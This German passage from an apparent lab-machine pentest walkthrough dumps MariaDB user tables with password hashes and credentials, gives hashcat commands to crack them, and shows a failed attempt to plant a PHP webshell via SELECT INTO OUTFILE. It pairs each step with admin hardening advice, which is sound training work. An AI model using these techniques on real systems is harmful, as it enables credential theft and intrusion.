+            <p class="evaluation"><strong>Bewertung:</strong> Die Tabelle enthält Informationen über den Gitea-Benutzer `gitea`. Besonders interessant ist der Passwort-Hash `<span class="password">b8b7...d42a</span>` und der Hashing-Algorithmus `<span class="command">pbkdf2</span>`. PBKDF2 ist ein stärkerer Algorithmus als MD5, aber immer noch potenziell knackbar, wenn das Passwort schwach ist. Es gibt auch eine E-Mail-Adresse (`test@test.com`) und einen Salt (`ef37...008f`). Der Benutzer ist als Admin (`is_admin = 1`) markiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den PBKDF2-Hash offline zu knacken (z.B. mit Hashcat, Modus muss ermittelt werden, oft 10900 für `PBKDF2-HMAC-SHA256`). Wenn erfolgreich, könnten Sie sich als Gitea-Admin anmelden. Überprüfen Sie auch andere Tabellen in der `gitea`-Datenbank (z.B. `repository`, `access_token`) auf sensible Informationen.
+            <br><strong>Empfehlung (Admin):</strong> Obwohl PBKDF2 besser als MD5 ist, sollten sicherere Algorithmen wie Argon2 oder bcrypt bevorzugt werden. Stellen Sie sicher, dass Gitea aktuell gehalten wird und erzwingen Sie starke Passwörter für Gitea-Benutzer, insbesondere Admins.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">MariaDB [gitea]> <span class="command">select * from user;</span></div>
+                    <pre>
++----+------------+-------+-----------+---------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+-----------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
+| id | lower_name | name  | full_name | email         | keep_email_private | email_notifications_preference | passwd                                                                                               | passwd_hash_algo | must_change_password | login_type | login_source | login_name | type | location | website | rands                            | salt                             | language | description | created_unix | updated_unix | last_login_unix | last_repo_visibility | max_repo_creation | is_active | is_admin | is_restricted | allow_git_hook | allow_import_local | allow_create_organization | prohibit_login | avatar                           | avatar_email    | use_custom_avatar | num_followers | num_following | num_stars | num_repos | num_teams | num_members | visibility | repo_admin_change_team_access | diff_view_style | theme | keep_activity_private |
++----+------------+-------+-----------+---------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+-----------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
+|  1 | <span class="command">gitea</span>      | <span class="command">gitea</span> |           | <span class="command">test@test.com</span> |                  0 | enabled                        | <span class="password">b8b7374376cd13dfe1fc292ac89daef30301e1ac97346110ee7fadc45020b3de6019f3830eed56020c403fd1c9fcc965d42a</span> | <span class="command">pbkdf2</span>           |                    0 |          0 |            0 |            |    0 |          |         | <span class="command">ef37455f6ca32c235a169248936f008f</span> | <span class="password">:wq</span>| <span class="command">en-US</span>    |             |   1648195414 |   1648549832 |      1648549832 |                    0 |                -1 |         1 | <span class="password">1</span>        |             0 |              0 |                  0 |                         1 |              0 | <span class="command">8e4e2991d9ce569d594e04c6d30c0797</span> | <span class="command">gitea@kitty.hmv</span> |                 1 |             0 |             0 |         0 |         2 |         0 |           0 |          0 |                             0 | unified         | auto  |                     0 |
++----+------------+-------+-----------+---------------+--------------------+--------------------------------+------------------------------------------------------------------------------------------------------+------------------+----------------------+------------+--------------+------------+------+----------+---------+----------------------------------+----------------------------------+----------+-------------+--------------+--------------+-----------------+----------------------+-------------------+-----------+----------+---------------+----------------+--------------------+---------------------------+----------------+----------------------------------+-----------------+-------------------+---------------+---------------+-----------+-----------+-----------+-------------+------------+-------------------------------+-----------------+-------+-----------------------+
+1 row in set (0.000 sec)
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `action`-Tabelle in der `gitea`-Datenbank wird abgefragt. Diese Tabelle protokolliert normalerweise Benutzeraktionen wie Commits, Kommentare, Issue-Erstellungen etc.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Tabelle enthält eine Reihe von Aktionen, hauptsächlich Commits und Kommentare (`op_type` 5 und 10) für Repository `repo_id = 2` und `repo_id = 3`. Einige Kommentare im `content`-Feld sind sehr aufschlussreich:
+            <ul><li>ID 5: `<span class="password">why this id_rsa key is not working ?</span>`</li><li>ID 9: `<span class="password">from where did you find that id_rsa key ?</span>`</li><li>ID 10: `<span class="password">from [here](http://whythisapiissofast.kitty.hmv)</span>` - Dies bestätigt, wie der SSH-Schlüssel (`idr`/`iiii`) und die API-Zugangsdaten (`nobody:74k3!7345y`) gefunden wurden!</li><li>ID 14: Listet Benutzernamen (`jack`, `robin`, `kevin`, `devil`, `mona`), die mit dem Schlüssel getestet wurden.</li><li>ID 19: `<span class="password">ok i check that another api endpoint</span>` - Bestätigt das Testen verschiedener API-Endpunkte.</li></ul>
+            Diese Einträge geben wertvolle Einblicke in die vorherigen Schritte und bestätigen die Quelle der gefundenen Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Informationen bestätigen die bisherigen Erkenntnisse. Es gibt hier keine direkten neuen Angriffspunkte, aber es festigt das Verständnis der Maschine. Fahren Sie mit der Untersuchung anderer Datenbanken und Tabellen fort.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Gitea-Konfiguration und -Nutzung. Stellen Sie sicher, dass sensible Diskussionen oder Informationen nicht in öffentlichen oder leicht zugänglichen Repositories oder Kommentaren landen. Schulen Sie Benutzer im sicheren Umgang mit Zugangsdaten und Schlüsseln.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">MariaDB [gitea]> <span class="command">select * from action;</span></div>
+                    <pre>
++----+---------+---------+-------------+---------+------------+------------+-------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+
+| id | user_id | op_type | act_user_id | repo_id | comment_id | is_deleted | ref_name          | is_private | content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | created_unix |
++----+---------+---------+-------------+---------+------------+------------+-------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+
+|  2 |       1 |       1 |           1 |       2 |          0 |          0 |                   |          0 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |   1648485841 |
+|  3 |       1 |       5 |           1 |       2 |          0 |          0 | refs/heads/master |          0 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |   1648486503 |
+|  4 |       1 |       5 |           1 |       2 |          0 |          0 | refs/heads/master |          0 | {"Commits":[{"Sha1":"5f710184be35647b6aa5016fd6c3af683c3f00b2","Message":"first commit\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T12:54:31-04:00"}],"HeadCommit":{"Sha1":"5f710184be35647b6aa5016fd6c3af683c3f00b2","Message":"first commit\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T12:54:31-04:00"},"CompareURL":"","Len":1}                                                                                                                                         |   1648486503 |
+|  5 |       1 |       6 |           1 |       2 |          0 |          0 |                   |          0 | <span class="password">1|why this id_rsa key is not working ?</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |   1648486615 |
+|  6 |       1 |      12 |           1 |       2 |          1 |          0 |                   |          0 | 1|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |   1648486655 |
+|  7 |       1 |       5 |           1 |       2 |          0 |          0 | refs/heads/master |          0 | {"Commits":[{"Sha1":"65cf6d2f0187d7c3cea53375e25452694f44e062","Message":"it will not work\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:00:55-04:00"}],"HeadCommit":{"Sha1":"65cf6d2f0187d7c3cea53375e25452694f44e062","Message":"it will not work\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:00:55-04:00"},"CompareURL":"gitea/test/compare/5f710184be35647b6aa5016fd6c3af683c3f00b2...65cf6d2f0187d7c3cea53375e25452694f44e062","Len":1}                           |   1648486857 |
+|  8 |       1 |       5 |           1 |       2 |          0 |          0 | refs/heads/master |          0 | {"Commits":[{"Sha1":"4b3bd5280e4138507f2e4fbb958702e4c3e467de","Message":"Update 'tests/test_simple.py'\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:01:19-04:00"}],"HeadCommit":{"Sha1":"4b3bd5280e4138507f2e4fbb958702e4c3e467de","Message":"Update 'tests/test_simple.py'\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:01:19-04:00"},"CompareURL":"gitea/test/compare/65cf6d2f0187d7c3cea53375e25452694f44e062...4b3bd5280e4138507f2e4fbb958702e4c3e467de","Len":1} |   1648486880 |
+|  9 |       1 |      10 |           1 |       2 |          2 |          0 |                   |          0 | <span class="password">1|from where did you find that id_rsa key ?</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |   1648486935 |
+| 10 |       1 |      10 |           1 |       2 |          3 |          0 |                   |          0 | <span class="password">1|from [Link: here | Ziel: http://whythisapiissofast.kitty.hmv]</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |   1648487025 |
+| 11 |       1 |       5 |           1 |       2 |          0 |          0 | refs/heads/master |          0 | {"Commits":[{"Sha1":"c4b38f1231b75bf6df5f5df54daef4db6f2e6b8c","Message":"it's a secret\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:06:14-04:00"}],"HeadCommit":{"Sha1":"c4b38f1231b75bf6df5f5df54daef4db6f2e6b8c","Message":"it's a secret\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:06:14-04:00"},"CompareURL":"gitea/test/compare/4b3bd5280e4138507f2e4fbb958702e4c3e467de...c4b38f1231b75bf6df5f5df54daef4db6f2e6b8c","Len":1}                                 |   1648487175 |
+| 12 |       1 |       5 |           1 |       2 |          0 |          0 | refs/heads/master |          0 | {"Commits":[{"Sha1":"d1f320ec7611b37fa63e3612c0771df43be8da87","Message":"it's still secret\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:06:38-04:00"}],"HeadCommit":{"Sha1":"d1f320ec7611b37fa63e3612c0771df43be8da87","Message":"it's still secret\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:06:38-04:00"},"CompareURL":"gitea/test/compare/c4b38f1231b75bf6df5f5df54daef4db6f2e6b8c...d1f320ec7611b37fa63e3612c0771df43be8da87","Len":1}                         |   1648487199 |
+| 13 |       1 |      10 |           1 |       2 |          4 |          0 |                   |          0 | 1|thanks for this.. i will check why it's not working                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |   1648487298 |
+| 14 |       1 |      10 |           1 |       2 |          5 |          0 |                   |          0 | <span class="command">1|hey user did you try these username</span>
+
+1. jack
+2. robin
+3. kevin
+4. devil
+5. mona                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |   1648487368 |
+| 15 |       1 |      10 |           1 |       2 |          6 |          0 |                   |          0 | 1|no i didn't check that id_rsa key with these names                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |   1648487398 |
+| 16 |       1 |      10 |           1 |       2 |          7 |          0 |                   |          0 | 1|wait i check                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |   1648487410 |
+| 17 |       1 |      10 |           1 |       2 |          8 |          0 |                   |          0 | 1|hey still that id_rsa key is not working                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |   1648487436 |
+| 18 |       1 |      10 |           1 |       2 |          9 |          0 |                   |          0 | 1|leave that id_rsa and try another thing then                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |   1648487466 |
+| 19 |       1 |      10 |           1 |       2 |         10 |          0 |                   |          0 | <span class="password">1|ok i check that another api endpoint</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |   1648487493 |
+| 20 |       1 |       1 |           1 |       3 |          0 |          0 |                   |          0 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |   1648487577 |
+| 21 |       1 |       5 |           1 |       3 |          0 |          0 | refs/heads/master |          0 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |   1648487812 |
+| 22 |       1 |       5 |           1 |       3 |          0 |          0 | refs/heads/master |          0 | {"Commits":[{"Sha1":"72caf452abfcb394dea58a25ee6a4bd71054f69c","Message":"first commit\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:16:30-04:00"}],"HeadCommit":{"Sha1":"72caf452abfcb394dea58a25ee6a4bd71054f69c","Message":"first commit\n","AuthorEmail":"test@test.com","AuthorName":"gitea","CommitterEmail":"test@test.com","CommitterName":"gitea","Timestamp":"2022-03-28T13:16:30-04:00"},"CompareURL":"","Len":1}                                                                                                                                         |   1648487812 |
++----+---------+---------+-------------+---------+------------+------------+-------------------+------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+
+21 rows in set (0.000 sec)
+</pre>
+                </div>
+            </div>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Die `mysql`-Datenbank wird ausgewählt (impliziert) und die `user`-Tabelle abgefragt. Diese Tabelle enthält Informationen über die MariaDB-Benutzerkonten selbst.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt die Standardbenutzer (`mariadb.sys`, `root`, `mysql`) sowie die Anwendungsbenutzer (`gitea`, `opencats`, `padding`). Wichtig sind die Passwort-Hashes in der `Password` oder `authentication_string` Spalte:
+            <ul><li>`root`: `<span class="password">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span>` (Dies ist der Hash für das Passwort 'root' im alten MySQL-Format, was den erfolgreichen Login zuvor erklärt).</li><li>`gitea`: `<span class="password">*00A51F3F48415C7D4E8908980D443C29C69B60C9</span>` (Ebenfalls altes Format)</li><li>`opencats`: `<span class="password">*64E2AC2D59D8460E07BCC704FCF131716DA0F295</span>` (Altes Format)</li><li>`padding`: `<span class="password">*25872B40E94F3C3F940F4E6B8CA08411EFDAD817</span>` (Hash für 'ihateyouadmin' im alten Format).</li></ul>
+            Das Vorhandensein dieser alten Hashes ist ein Zeichen für eine potenziell veraltete oder nicht optimal konfigurierte Datenbankinstallation. Es bestätigt auch die gefundenen Passwörter (`root`, `ihateyouadmin`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Hashes könnten offline geknackt werden (Hashcat Modus 300: `mysql-sha1`), obwohl die Passwörter bereits bekannt sind. Notieren Sie die Benutzerliste. Konzentrieren Sie sich auf die Untersuchung der `padding`-Datenbank, da hierfür bereits Zugangsdaten bekannt sind.
+            <br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie die Passwort-Hashes auf das native Format von MariaDB (`mysql_native_password`) oder sicherere Methoden. Überprüfen Sie die Notwendigkeit aller Benutzerkonten. Ändern Sie alle Standard- oder schwachen Passwörter.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">MariaDB [mysql]> <span class="command">select * from user;</span></div>
+                    <pre>
++-----------+-------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
+| Host      | User        | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | is_role | default_role | max_statement_time |
++-----------+-------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
+| localhost | mariadb.sys |                                           | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password |                                           | Y                | N       |              |           0.000000 |
+| localhost | <span class="command">root</span>        | <span class="password">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span> | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B | N                | N       |              |           0.000000 |
+| localhost | mysql       | invalid                                   | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | invalid                                   | N                | N       |              |           0.000000 |
+| localhost | <span class="command">gitea</span>       | <span class="password">*00A51F3F48415C7D4E8908980D443C29C69B60C9</span> | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *00A51F3F48415C7D4E8908980D443C29C69B60C9 | N                | N       |              |           0.000000 |
+| localhost | <span class="command">opencats</span>    | <span class="password">*64E2AC2D59D8460E07BCC704FCF131716DA0F295</span> | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *64E2AC2D59D8460E07BCC704FCF131716DA0F295 | N                | N       |              |           0.000000 |
+| localhost | <span class="command">padding</span>     | <span class="password">*25872B40E94F3C3F940F4E6B8CA08411EFDAD817</span> | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *25872B40E94F3C3F940F4E6B8CA08411EFDAD817 | N                | N       |              |           0.000000 |
++-----------+-------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
+6 rows in set (0.001 sec)
+</pre>
+                </div>
+            </div>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit dem Benutzer `padding` und dem Passwort `ihateyouadmin` anzumelden. Dies ist erfolgreich. Anschließend werden die Datenbanken aufgelistet, zur `padding`-Datenbank gewechselt und deren Tabellen angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login als `padding` funktioniert wie erwartet. Dieser Benutzer hat nur Zugriff auf `information_schema` und die `padding`-Datenbank. In der `padding`-Datenbank gibt es drei Tabellen: `<span class="command">logs</span>`, `<span class="command">salt</span>` und `<span class="command">users</span>`. Diese sind nun das Ziel der weiteren Untersuchung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fragen Sie den Inhalt der Tabellen `users`, `salt` und `logs` ab, um die darin enthaltenen Daten zu analysieren.
+            <br><strong>Empfehlung (Admin):</strong> Die Berechtigungen für den Benutzer `padding` scheinen korrekt auf die eigene Datenbank beschränkt zu sein. Stellen Sie sicher, dass dies für alle Anwendungsbenutzer gilt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:/var/www/cookie/home$ <span class="command">mysql -u padding -p</span></div>
+                    <pre>Enter password: <span class="comment">(Passwort 'ihateyouadmin' eingegeben)</span>
+<span class="password">Welcome to the MariaDB monitor.</span>  Commands end with ; or \g.
+Your MariaDB connection id is 137
+Server version: 10.5.15-MariaDB-1:10.5.15+maria~bullseye mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+<span class="prompt">MariaDB [(none)]> </span><span class="command">show databases;</span>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| <span class="command">padding</span>            |
++--------------------+
+2 rows in set (0.000 sec)
+
+<span class="prompt">MariaDB [(none)]> </span><span class="command">use padding;</span>
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+<span class="prompt">MariaDB [padding]> </span><span class="command">show tables;</span>
++-------------------+
+| Tables_in_padding |
++-------------------+
+| <span class="command">logs</span>              |
+| <span class="command">salt</span>              |
+| <span class="command">users</span>             |
++-------------------+
+3 rows in set (0.000 sec)
+
+<span class="prompt">MariaDB [padding]> </span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `users`-Tabelle in der `padding`-Datenbank wird abgefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Tabelle enthält zwei Benutzer: `admin` und `gitea`. Die zugehörigen Passwörter sind als Hashes gespeichert:
+            <ul><li>`admin`: `<span class="password">44db80f98c693eac47540c51137eeeac</span>` (MD5-Hash)</li><li>`gitea`: `<span class="password">357f47546ba3ab1cf633d3d0c54e2583</span>` (MD5-Hash)</li></ul>
+            Der Hash für `gitea` ist derselbe, der zuvor erfolglos mit `hashcat` (im Modus `md5($pass.$salt)`) angegriffen wurde. Das Fehlen eines Salts in dieser Tabelle oder die Verwendung eines anderen Hash-Typs könnte der Grund sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Versuchen Sie, die MD5-Hashes offline zu knacken (z.B. mit `hashcat -m 0 <hash>`). MD5 ist sehr unsicher.</li><li>Überprüfen Sie die `salt`-Tabelle, um zu sehen, ob der dortige Salt für diese Hashes relevant ist (unwahrscheinlich bei reinem MD5, aber möglich bei benutzerdefinierten Schemata).</li><li>Prüfen Sie die `logs`-Tabelle auf weitere Hinweise.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Verwenden Sie niemals MD5 zum Speichern von Passwörtern. Migrieren Sie zu Argon2 oder bcrypt mit eindeutigen Salts pro Benutzer.</li><li>Erzwingen Sie starke Passwörter.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">MariaDB [padding]> <span class="command">select * from users;</span></div>
+                    <pre>
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| <span class="command">admin</span>    | <span class="password">44db80f98c693eac47540c51137eeeac</span> |
+| <span class="command">gitea</span>    | <span class="password">357f47546ba3ab1cf633d3d0c54e2583</span> |
++----------+----------------------------------+
+2 rows in set (0.000 sec)
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `logs`-Tabelle wird abgefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Tabelle scheint Login- und Logout-Ereignisse für die Benutzer `admin` und `jack` zu protokollieren. Sie liefert keine direkten neuen Angriffspunkte, bestätigt aber die Existenz des Benutzers `jack`, der auch in den Gitea-Logs erwähnt wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nehmen Sie die Information zur Kenntnis. Konzentrieren Sie sich auf das Knacken der Hashes aus der `users`-Tabelle und die Untersuchung der `salt`-Tabelle.
+            <br><strong>Empfehlung (Admin):</strong> Logging ist wichtig, aber stellen Sie sicher, dass Logs keine übermäßig sensiblen Informationen enthalten und vor unbefugtem Zugriff oder Manipulation geschützt sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">MariaDB [padding]> <span class="command">select * from logs;</span></div>
+                    <pre>
++----+----------+--------------+
+| id | username | last         |
++----+----------+--------------+
+|  1 | admin    | login admin  |
+|  2 | admin    | logout admin |
+|  3 | jack     | login jack   |
+|  4 | jack     | logout jack  |
+|  5 | admin    | login admin  |
+|  6 | admin    | logout admin |
+|  7 | admin    | login admin  |
+|  8 | admin    | login admin  |
+|  9 | admin    | logout admin |
++----+----------+--------------+
+9 rows in set (0.000 sec)
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `salt`-Tabelle wird abgefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Tabelle enthält einen einzigen Eintrag vom Typ `salt` mit dem Wert `<span class="password">YXZpam5leWFt</span>`. Dies ist derselbe Salt, der zuvor beim `hashcat`-Versuch verwendet wurde (`md5($pass.$salt)`). Dies bestätigt, dass der `gitea`-Hash aus der `users`-Tabelle (`357f...`) wahrscheinlich mit diesem Salt gehasht wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie den `hashcat`-Befehl erneut aus, diesmal mit dem korrekten Hash und Salt: `hashcat -m 10 -a 0 357f47546ba3ab1cf633d3d0c54e2583:YXZpam5leWFt /usr/share/wordlists/rockyou.txt`. Versuchen Sie auch, den `admin`-Hash (`44db...`) mit demselben Salt zu knacken: `hashcat -m 10 -a 0 44db80f98c693eac47540c51137eeeac:YXZpam5leWFt /usr/share/wordlists/rockyou.txt`.
+            <br><strong>Empfehlung (Admin):</strong> Die Verwendung eines globalen Salts ist besser als kein Salt, aber individuelle Salts pro Benutzer sind deutlich sicherer. Migrieren Sie zu einem Hashing-Schema mit individuellen Salts und einem modernen Algorithmus (Argon2, bcrypt).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">MariaDB [padding]> <span class="command">select * from salt;</span></div>
+                    <pre>
++------+--------------+
+| type | value        |
++------+--------------+
+| salt | <span class="password">YXZpam5leWFt</span> |
++------+--------------+
+1 row in set (0.000 sec)
+</pre>
+                </div>
+            </div>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mittels `SELECT ... INTO OUTFILE` eine PHP-Webshell (`<?php system($REQUEST['ben']); ?>`) in das Web-Root-Verzeichnis zu schreiben. `INTO OUTFILE` erlaubt das Schreiben von Abfrageergebnissen in eine Datei auf dem Server. Die Zieldateien sind `/var/www/html/ben.php` und `/var/www/cookie/ben.php`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Beide Versuche schlagen fehl mit `<span class="password">ERROR 1045 (28000): Access denied for user 'padding'@'localhost'</span>`. Dies liegt daran, dass der Datenbankbenutzer `padding` nicht über die `FILE`-Berechtigung verfügt, die für `SELECT ... INTO OUTFILE` erforderlich ist. Das ist eine wichtige Sicherheitsmaßnahme.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `INTO OUTFILE` nicht funktioniert, kann dieser Vektor zur Codeausführung nicht genutzt werden. Suchen Sie nach anderen Wegen (z.B. Ausnutzung von Webanwendungs-Schwachstellen, Cronjob-Manipulation).
+            <br><strong>Empfehlung (Admin):</strong> Vergeben Sie die `FILE`-Berechtigung nur an absolut vertrauenswürdige administrative Datenbankbenutzer und niemals an Benutzerkonten, die von Webanwendungen verwendet werden. Dies ist eine kritische Maßnahme zur Verhinderung von Webshell-Uploads über SQL-Injection.</p>
